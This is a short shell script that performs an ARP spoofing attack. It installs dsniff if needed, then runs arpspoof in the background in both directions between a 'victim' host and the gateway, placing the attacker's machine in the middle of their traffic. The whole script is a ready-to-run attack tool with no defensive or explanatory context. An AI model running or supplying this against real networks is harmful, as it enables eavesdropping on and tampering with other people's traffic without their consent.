if [ $# -lt 2 ]; then
    echo "Usage: $0 <VICTIM> <GATEWAY>"
    exit 1
fi

pkg=dsniff
status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
  sudo apt install $pkg
fi

VICTIM=$1
GATEWAY=$2

echo "Beginning ARPSpoof attack. Victim $VICTIM, Gateway $GATEWAY. Running in background"
echo "Run pkill arpspoof to stop arpspoofing"

nohup arpspoof -t $VICTIM $GATEWAY > /dev/null 2>&1 & 
nohup arpspoof -t $GATEWAY $VICTIM > /dev/null 2>&1 &
